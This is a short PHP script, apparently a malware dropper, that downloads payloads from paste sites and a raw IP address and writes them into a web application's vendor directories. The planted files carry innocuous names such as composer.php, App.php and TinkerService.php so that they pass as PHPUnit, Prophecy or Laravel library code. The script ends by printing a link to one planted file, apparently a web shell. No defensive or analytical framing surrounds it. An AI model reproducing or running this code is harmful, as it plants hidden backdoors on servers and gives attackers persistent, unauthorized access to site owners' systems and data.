<title>m6m6m6</title>
<?php
function http_get($url)
{
    $im = curl_init($url);
    curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
    curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($im, CURLOPT_HEADER, 0);
    return curl_exec($im);
    curl_close($im);
}
$check = getcwd() . "/vendor/phpunit/php-file-iterator/composer.php";
$text  = http_get("https://ghostbin.co/paste/etmgz/raw");
$open  = fopen($check, "w");
fwrite($open, $text);
fclose($open);
if (file_exists($check)) {
    echo $check . "</br>";
} else
    echo "not exits";
echo "done .
 ";
$check2 = getcwd() . "/vendor/phpunit/php-timer/src/service.php";
$text2  = http_get("http://207.46.231.136/userpo.txt");
$open2  = fopen($check2, "w");
fwrite($open2, $text2);
fclose($open2);
if (file_exists($check2)) {
    echo $check2 . "</br>";
} else
    echo "not exits";
echo "done .
 ";
$check3 = getcwd() . "/vendor/phpunit/php-code-coverage/src/App.php";
$text3  = http_get("https://ghostbin.co/paste/9yfep/raw");
$open3  = fopen($check3, "w");
fwrite($open3, $text3);
fclose($open3);
if (file_exists($check3)) {
    echo $check3 . "</br>";
} else
    echo "not exits";
echo "done .
 ";
$check5 = getcwd() . "/vendor/phpunit/phpunit/composer.php";
$text5  = http_get("https://ghostbin.co/paste/wugrg/raw");
$open5  = fopen($check5, "w");
fwrite($open5, $text5);
fclose($open5);
if (file_exists($check5)) {
    echo $check5 . "</br>";
} else
    echo "not exits";
echo "done .
 ";
$check7 = getcwd() . "/vendor/phpspec/prophecy/README.php";
$text7  = http_get("https://ghostbin.co/paste/jfu77/raw");
$open7  = fopen($check7, "w");
fwrite($open7, $text7);
fclose($open7);
if (file_exists($check7)) {
    echo $check7 . "</br>";
} else
    echo "not exits";
echo "done .
 ";
$check8 = getcwd() . "/vendor/laravel/framework/src/Illuminate/BroadcastingChannel.php";
$text8  = http_get("https://ghostbin.co/paste/2ubpw/raw");
$open8  = fopen($check8, "w");
fwrite($open8, $text8);
fclose($open8);
if (file_exists($check8)) {
    echo $check8 . "</br>";
} else
    echo "not exits";
echo "done .
 ";
$check9 = getcwd() . "/vendor/laravel/tinker/src/TinkerService.php";
$text9  = http_get("https://ghostbin.co/paste/w2bhv/raw");
$open9  = fopen($check9, "w");
fwrite($open9, $text9);
fclose($open9);
if (file_exists($check9)) {
    echo $check9 . "</br>";
} else
    echo "not exits";
echo "done .
 ";
$check6 = getcwd() . "/vendor/phpunit/php-file-iterator/src/yah.php";
$text6  = http_get("http://207.46.231.136/ssh.txt");
$open6  = fopen($check6, "w");
fwrite($open6, $text6);
fclose($open6);
if (file_exists($check6)) {
    echo $check6 . "</br>";
} else
    echo "not exits";
echo "HALL : <a href=\"http://" . $_SERVER['HTTP_HOST'] . "/lib/vendor/phpunit/phpunit/composer.php\">" . $_SERVER['HTTP_HOST'] . "/lib/vendor/phpunit/phpunit/composer.php</a>\n<br>";
?>